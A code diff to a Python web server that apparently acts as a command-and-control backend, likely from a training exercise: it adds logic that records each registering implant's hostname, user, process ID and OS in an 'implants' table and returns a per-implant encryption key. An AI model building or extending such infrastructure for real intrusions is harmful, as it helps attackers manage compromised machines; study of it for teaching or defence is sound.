@@ -1,4 +1,5 @@
 import base64
+import datetime
 import json
 import pymysql
 import random
@@ -28,13 +29,12 @@ class WebServer(object):
 
         # tries to open a database connection
         try:
-            self.connection = pymysql.connect(
-                host="localhost",
-                port=3306,
-                user=username,
-                passwd=password,
-                db=database,
-                autocommit=True)
+            self.connection = pymysql.connect(host="localhost",
+                                              port=3306,
+                                              user=username,
+                                              passwd=password,
+                                              db=database,
+                                              autocommit=True)
 
         except Exception:
             raise
@@ -77,9 +77,19 @@ class WebServer(object):
             # generates a random 32 character encryption key
             encryption_key = "".join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(32))
 
-            # TO DO: INSERT an entry into the "implants" table here
+            # gets current time (uses server's time)
+            now = datetime.datetime.now()
+            time = now.strftime("%Y-%m-%d %H:%M:%S")
 
-            # TO DO: "return" random 32 character encryption key in the http response
+            # TO DO: INSERT an entry into the "implants" table here
+            with self.connection.cursor() as cursor:
+                statement = "INSERT INTO `implants` (`hostname`, `current_user`, `process_id`, `operating_system`, `last_seen`, `encryption_key`) VALUES (%s, %s, %s, %s, %s, %s)"
+                cursor.execute(statement, (hostname,
+                                           current_user,
+                                           process_id,
+                                           operating_system,
+                                           time,
+                                           encryption_key))
 
             # returns generated encryption key in the http response
             return encryption_key
